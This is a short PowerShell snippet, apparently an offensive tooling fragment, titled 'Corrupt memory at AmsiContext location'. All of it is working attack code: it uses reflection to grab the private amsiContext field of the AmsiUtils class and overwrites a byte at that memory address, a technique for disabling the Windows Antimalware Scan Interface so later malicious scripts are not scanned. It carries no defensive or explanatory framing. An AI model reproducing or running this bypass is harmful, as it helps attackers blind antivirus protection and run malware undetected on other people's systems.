# Corrupt memory at AmsiContext location

$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiContext','NonPublic,Static')
[IntPtr]$ptr = $b.GetValue($null)
[Byte[]]$buf=@(0)
# source, startIndex, destination, length
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
